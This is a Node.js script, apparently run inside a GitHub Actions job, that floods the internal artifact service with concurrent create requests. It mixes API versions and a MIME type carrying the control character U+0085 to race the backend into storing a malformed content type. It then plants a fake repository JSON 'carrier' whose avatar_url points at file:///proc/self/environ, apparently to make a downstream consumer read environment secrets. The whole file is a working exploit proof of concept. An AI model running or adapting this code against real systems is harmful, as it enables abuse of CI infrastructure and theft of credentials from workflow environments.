import {createHash} from 'node:crypto';
import {writeFileSync} from 'node:fs';
import {BlobClient} from '@azure/storage-blob';
import {internalArtifactTwirpClient} from '../node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import {getBackendIdsFromToken} from '../node_modules/@actions/artifact/lib/internal/shared/util.js';
import {StringValue} from '../node_modules/@actions/artifact/lib/generated/index.js';

const ids = getBackendIdsFromToken();
const client = internalArtifactTwirpClient({maxAttempts: 1});
const odd = '\u0085application/json';
const placeholder = Buffer.from('{"probe":"contention"}');
const hash = `sha256:${createHash('sha256').update(placeholder).digest('hex')}`;
const winners = [];
const COUNT = 96;
const WIDTH = 16;

async function create(name, version) {
  const mimeType = version === 6 ? odd : 'application/json';
  try {
    const value = await client.CreateArtifact({
      workflowRunBackendId: ids.workflowRunBackendId,
      workflowJobRunBackendId: ids.workflowJobRunBackendId,
      name, version, mimeType: StringValue.create({value: mimeType}),
    });
    return {ok: true, url: value.signedUploadUrl, version};
  } catch (error) {
    return {ok: false, error: String(error).slice(0, 160), version};
  }
}

async function upload(url, bytes) {
  if (!url) return false;
  await new BlobClient(url).getBlockBlobClient().uploadData(bytes, {
    blobHTTPHeaders: {blobContentType: odd},
  });
  return true;
}

async function finalize(name) {
  try {
    const value = await client.FinalizeArtifact({
      workflowRunBackendId: ids.workflowRunBackendId,
      workflowJobRunBackendId: ids.workflowJobRunBackendId,
      name, size: String(placeholder.length),
      hash: StringValue.create({value: hash}),
    });
    return {ok: true, id: String(value.artifactId)};
  } catch (error) {
    return {ok: false, error: String(error).slice(0, 160)};
  }
}

async function inspect(name) {
  try {
    const value = await client.GetSignedArtifactURL({
      workflowRunBackendId: ids.workflowRunBackendId,
      workflowJobRunBackendId: ids.workflowJobRunBackendId,
      name,
    });
    return {ok: true, contentType: new URL(value.signedUrl).searchParams.get('rsct')};
  } catch (error) {
    return {ok: false, error: String(error).slice(0, 160)};
  }
}

function carrierBytes(repository) {
  return Buffer.from(JSON.stringify({
    full_name: repository,
    owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
    description: 'Repo Cassette contention carrier',
    stargazers_count: 0,
  }));
}

const groups = Array.from({length: COUNT}, (_, index) => ({
  index,
  name: `contention-${process.env.GITHUB_RUN_ID}-${index}`,
  creates: [],
}));

// Put every request in one Promise.all so separate names also load the insert path.
const requests = [];
for (const group of groups) {
  for (let attempt = 0; attempt < WIDTH; attempt++) {
    const version = (attempt + group.index) % 2 === 0 ? 6 : 7;
    requests.push(create(group.name, version).then(result => {
      group.creates.push(result);
      return result;
    }));
  }
}
await Promise.all(requests);

await Promise.all(groups.map(async group => {
  await Promise.all(group.creates.map(item => upload(item.url, placeholder).catch(() => false)));
}));

const rows = await Promise.all(groups.map(async group => {
  const final = await finalize(group.name);
  const view = await inspect(group.name);
  const isOdd = view.contentType?.includes('\u0085') ?? false;
  const row = {
    index: group.index,
    created6: group.creates.filter(x => x.ok && x.version === 6).length,
    created7: group.creates.filter(x => x.ok && x.version === 7).length,
    errors: group.creates.filter(x => !x.ok).length,
    final,
    view: view.ok ? {
      ok: true,
      contentType: JSON.stringify(view.contentType).slice(1, -1),
    } : view,
    isOdd,
  };
  if (isOdd && final.id) {
    const repository = `${process.env.GITHUB_REPOSITORY}/actions/artifacts/${final.id}/zip`;
    const placed = await Promise.all(
      group.creates.map(item => upload(item.url, carrierBytes(repository)).catch(() => false)),
    );
    row.repository = repository;
    row.carrierPlaced = placed.some(Boolean);
    if (row.carrierPlaced) winners.push({id: final.id, name: group.name, repository});
  }
  console.log(`CONTENTION ${JSON.stringify(row)}`);
  return row;
}));

const summary = {
  total: rows.length,
  width: WIDTH,
  odd: rows.filter(row => row.isOdd).length,
  finalized: rows.filter(row => row.final?.ok).length,
  bothVersions: rows.filter(row => row.created6 && row.created7).length,
};
console.log(`CONTENTION_SUMMARY ${JSON.stringify(summary)}`);
writeFileSync('carrier-results.json', JSON.stringify({
  runId: process.env.GITHUB_RUN_ID,
  repository: process.env.GITHUB_REPOSITORY,
  winners, summary, rows,
}, null, 2) + '\n');
